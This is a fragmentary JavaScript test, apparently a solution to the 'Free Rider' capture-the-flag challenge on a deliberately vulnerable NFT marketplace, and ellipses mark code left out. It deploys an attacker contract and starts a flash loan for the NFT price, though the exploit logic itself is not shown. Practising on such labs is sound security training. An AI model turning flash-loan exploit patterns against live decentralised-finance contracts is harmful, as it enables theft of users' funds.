...
describe('[Challenge] Free Rider', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackerFreeRiderFactory = await ethers.getContractFactory(
            "FreeRiderAttack",
            attacker
          );

        this.attackerContract = await AttackerFreeRiderFactory.deploy(
        ...
        await this.attackerContract.callFlashLoan(NFT_PRICE);
    });
